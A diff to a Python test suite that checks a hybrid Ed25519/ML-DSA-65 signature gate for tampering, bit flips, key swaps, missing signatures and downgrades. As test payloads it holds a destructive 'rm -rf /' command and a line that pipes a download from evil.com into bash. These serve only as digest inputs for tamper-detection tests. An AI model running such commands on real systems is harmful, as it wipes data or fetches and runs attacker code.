@@ -3,58 +3,53 @@ Agile Defense Systems, LLC | CAGE Code: 9HUP5
 OSIRIS 6.0 | Pillar 4: Silicon-Anchored Post-Quantum Cryptographic Enclave
 Adversarial Verification Test Suite: test_p4_adversarial_pqc.py
 
-Validates:
-1. NIST FIPS 204 ML-DSA-65 / Ed25519 Hybrid Signature Integrity.
+Phase-3 reconciliation: signatures are now REAL Ed25519 + FIPS 204 ML-DSA-65
+(pyca/cryptography), not SHA3-512 placeholders. Validates:
+1. NIST FIPS 204 ML-DSA-65 / Ed25519 Hybrid Signature Integrity (real verify).
 2. Tamper-evident SHAKE-256 prehash lattice reduction verification.
 3. Strict fail-closed rejection of unauthorized operators (SYS-021).
-4. Envelope mutation and missing signature detection.
+4. Envelope mutation, bit-flipped signatures, wrong-key substitution, and
+   missing signature detection.
 """
 
 import pytest
-import hashlib
 from osiris_cli.pqc_enclave import PQCEnclaveGate, PQCAlgorithm
+
+PREV = "1cf5fddb243df88bd747ad40736050311b9f5e0b25057e2023455d1ab801df71"
+
+
+def _grant(gate, event_type, payload, schema=None):
+    return gate.generate_hybrid_grant(
+        sequence_index=28,
+        prev_block_hash=PREV,
+        event_type=event_type,
+        payload_sha256=gate.compute_payload_digest(payload),
+        operation_schema=schema or {"target": "pqc_enclave", "action": "activate_pillar_4"},
+    )
 
 
 def test_valid_hybrid_grant_verification():
-    """Verify that a properly constructed hybrid PQC grant passes verification."""
+    """A grant signed by the gate's real Ed25519 + ML-DSA-65 keys verifies."""
     gate = PQCEnclaveGate(operator_id="Devin Phillip Davis / Enki")
-    payload = "def verify_silicon_anchor(): return True"
-    payload_sha256 = gate.compute_payload_digest(payload)
-
-    ed25519_sig = "a1b2c3d4" * 16  # 64-byte simulated classical sig
-    grant = gate.generate_hybrid_grant(
-        sequence_index=28,
-        prev_block_hash="1cf5fddb243df88bd747ad40736050311b9f5e0b25057e2023455d1ab801df71",
-        event_type="SYS021_OSIRIS_60_PQC_ENCLAVE_AND_PILLARS_ACTIVATION",
-        payload_sha256=payload_sha256,
-        operation_schema={"target": "pqc_enclave", "action": "activate_pillar_4"},
-        ed25519_sig_hex=ed25519_sig,
-    )
+    grant = _grant(gate, "SYS021_OSIRIS_60_PQC_ENCLAVE_AND_PILLARS_ACTIVATION", "def verify_silicon_anchor(): return True")
 
     valid, reason = gate.verify_grant_integrity(grant)
     assert valid is True
     assert reason == "VERIFIED_HYBRID_PQC_OK"
-    assert grant["pqc_envelope"]["algorithm"] == PQCAlgorithm.HYBRID_ED25519_ML_DSA_65.value
-    assert grant["pqc_envelope"]["lattice_parameters"]["ring_degree"] == 256
-    assert grant["pqc_envelope"]["lattice_parameters"]["matrix_dimensions"] == "6x5"
+    env = grant["pqc_envelope"]
+    assert env["algorithm"] == PQCAlgorithm.HYBRID_ED25519_ML_DSA_65.value
+    assert env["lattice_parameters"]["ring_degree"] == 256
+    assert env["lattice_parameters"]["matrix_dimensions"] == "6x5"
+    # Real signature sizes: Ed25519 = 64 bytes, ML-DSA-65 = 3309 bytes
+    assert len(bytes.fromhex(env["ed25519_signature"])) == 64
+    assert len(bytes.fromhex(env["ml_dsa_signature"])) == 3309
+    assert len(bytes.fromhex(env["ed25519_public_key"])) == 32
+    assert len(bytes.fromhex(env["ml_dsa_public_key"])) == 1952
 
 
 def test_adversarial_unauthorized_operator_id():
-    """Adversarial Test: An attacker attempts to execute operations under an unauthorized identity."""
     gate = PQCEnclaveGate(operator_id="Devin Phillip Davis / Enki")
-    payload = "rm -rf /"
-    payload_sha256 = gate.compute_payload_digest(payload)
-
-    grant = gate.generate_hybrid_grant(
-        sequence_index=28,
-        prev_block_hash="1cf5fddb243df88bd747ad40736050311b9f5e0b25057e2023455d1ab801df71",
-        event_type="SYS021_ADVERSARIAL_INTRUSION",
-        payload_sha256=payload_sha256,
-        operation_schema={"target": "system", "action": "wipe"},
-        ed25519_sig_hex="00" * 64,
-    )
-
-    # Infiltrator mutates operator ID
+    grant = _grant(gate, "SYS021_ADVERSARIAL_INTRUSION", "rm -rf /", {"target": "system", "action": "wipe"})
     grant["operator_id"] = "Rogue Agent / Malicious Entity"
     valid, reason = gate.verify_grant_integrity(grant)
     assert valid is False
@@ -62,76 +57,79 @@ def test_adversarial_unauthorized_operator_id():
 
 
 def test_adversarial_prehash_and_payload_tampering():
-    """Adversarial Test: In-place mutation of executable payload without grant invalidation detection."""
     gate = PQCEnclaveGate(operator_id="Devin Phillip Davis / Enki")
-    benign_code = "print('system safe')"
-    payload_sha256 = gate.compute_payload_digest(benign_code)
-
-    grant = gate.generate_hybrid_grant(
-        sequence_index=28,
-        prev_block_hash="1cf5fddb243df88bd747ad40736050311b9f5e0b25057e2023455d1ab801df71",
-        event_type="SYS021_SAFE_TASK",
-        payload_sha256=payload_sha256,
-        operation_schema={"target": "worker", "action": "run"},
-        ed25519_sig_hex="deadbeef" * 16,
-    )
-
-    # Tamper payload_sha256 to point to malicious code
+    grant = _grant(gate, "SYS021_SAFE_TASK", "print('system safe')", {"target": "worker", "action": "run"})
     malicious_code = "import os; os.system('curl evil.com | bash')"
     grant["payload_sha256"] = gate.compute_payload_digest(malicious_code)
-
-    # The gate must detect prehash divergence against the mutated payload
     valid, reason = gate.verify_grant_integrity(grant)
     assert valid is False
     assert "FIPS 204 SHAKE-256 prehash mismatch" in reason
 
 
-def test_adversarial_corrupted_signature_rejection():
-    """Adversarial Test: Tampering with quantum or classical signature bytes fails closed."""
+def test_adversarial_signature_bitflip_rejected():
+    """Flipping one bit in either real signature must fail closed."""
     gate = PQCEnclaveGate(operator_id="Devin Phillip Davis / Enki")
-    payload = "compile_kernel()"
-    payload_sha256 = gate.compute_payload_digest(payload)
+    grant = _grant(gate, "SYS021_COMPILE", "compile_kernel()", {"target": "compiler", "action": "compile"})
 
-    grant = gate.generate_hybrid_grant(
-        sequence_index=28,
-        prev_block_hash="1cf5fddb243df88bd747ad40736050311b9f5e0b25057e2023455d1ab801df71",
-        event_type="SYS021_COMPILE",
-        payload_sha256=payload_sha256,
-        operation_schema={"target": "compiler", "action": "compile"},
-        ed25519_sig_hex="1234" * 16,
-    )
+    sig = grant["pqc_envelope"]["ml_dsa_signature"]
+    raw = bytearray(bytes.fromhex(sig))
+    raw[100] ^= 0x01
+    grant["pqc_envelope"]["ml_dsa_signature"] = raw.hex()
+    valid, reason = gate.verify_grant_integrity(grant)
+    assert valid is False
+    assert "signature verification failed" in reason
 
-    # Corrupt classical signature
+    grant2 = _grant(gate, "SYS021_COMPILE", "compile_kernel()", {"target": "compiler", "action": "compile"})
+    sig = grant2["pqc_envelope"]["ed25519_signature"]
+    raw = bytearray(bytes.fromhex(sig))
+    raw[0] ^= 0x01
+    grant2["pqc_envelope"]["ed25519_signature"] = raw.hex()
+    valid, reason = gate.verify_grant_integrity(grant2)
+    assert valid is False
+    assert "signature verification failed" in reason
+
+
+def test_adversarial_wrong_key_substitution_rejected():
+    """Swapping in another keypair's public keys must fail verification."""
+    gate = PQCEnclaveGate(operator_id="Devin Phillip Davis / Enki")
+    other = PQCEnclaveGate(operator_id="Devin Phillip Davis / Enki")
+    grant = _grant(gate, "SYS021_KEYSWAP", "payload")
+    grant["pqc_envelope"]["ed25519_public_key"] = other.public_keys_hex()["ed25519_public_key"]
+    grant["pqc_envelope"]["ml_dsa_public_key"] = other.public_keys_hex()["ml_dsa_public_key"]
+    valid, reason = gate.verify_grant_integrity(grant)
+    assert valid is False
+    assert "signature verification failed" in reason
+
+
+def test_adversarial_missing_signature_rejected():
+    gate = PQCEnclaveGate(operator_id="Devin Phillip Davis / Enki")
+    grant = _grant(gate, "SYS021_STRIP", "compile_kernel()")
     grant["pqc_envelope"]["ed25519_signature"] = ""
     valid, reason = gate.verify_grant_integrity(grant)
     assert valid is False
     assert "Incomplete hybrid cryptographic signatures" in reason
 
-    # Restore classical, strip ML-DSA signature
-    grant["pqc_envelope"]["ed25519_signature"] = "1234" * 16
-    grant["pqc_envelope"]["ml_dsa_signature"] = ""
-    valid, reason = gate.verify_grant_integrity(grant)
+    grant2 = _grant(gate, "SYS021_STRIP", "compile_kernel()")
+    grant2["pqc_envelope"]["ml_dsa_signature"] = ""
+    valid, reason = gate.verify_grant_integrity(grant2)
     assert valid is False
     assert "Incomplete hybrid cryptographic signatures" in reason
 
 
 def test_adversarial_specification_downgrade():
-    """Adversarial Test: Downgrade attack attempting to bypass FIPS 204 requirements."""
     gate = PQCEnclaveGate(operator_id="Devin Phillip Davis / Enki")
-    payload = "downgrade_cipher()"
-    payload_sha256 = gate.compute_payload_digest(payload)
-
-    grant = gate.generate_hybrid_grant(
-        sequence_index=28,
-        prev_block_hash="1cf5fddb243df88bd747ad40736050311b9f5e0b25057e2023455d1ab801df71",
-        event_type="SYS021_CIPHER",
-        payload_sha256=payload_sha256,
-        operation_schema={"target": "crypto", "action": "downgrade"},
-        ed25519_sig_hex="beef" * 16,
-    )
-
-    # Infiltrator attempts specification downgrade
+    grant = _grant(gate, "SYS021_CIPHER", "downgrade_cipher()", {"target": "crypto", "action": "downgrade"})
     grant["pqc_envelope"]["specification"] = "LEGACY_RSA_2048"
     valid, reason = gate.verify_grant_integrity(grant)
     assert valid is False
     assert "Unsupported PQC specification" in reason
+
+
+def test_placeholder_style_signature_no_longer_accepted():
+    """The old SHA3-512 placeholder ('1234'*16 style) must fail closed now."""
+    gate = PQCEnclaveGate(operator_id="Devin Phillip Davis / Enki")
+    grant = _grant(gate, "SYS021_PLACEHOLDER", "payload")
+    grant["pqc_envelope"]["ed25519_signature"] = "1234" * 16
+    grant["pqc_envelope"]["ml_dsa_signature"] = "ab" * 3309
+    valid, reason = gate.verify_grant_integrity(grant)
+    assert valid is False
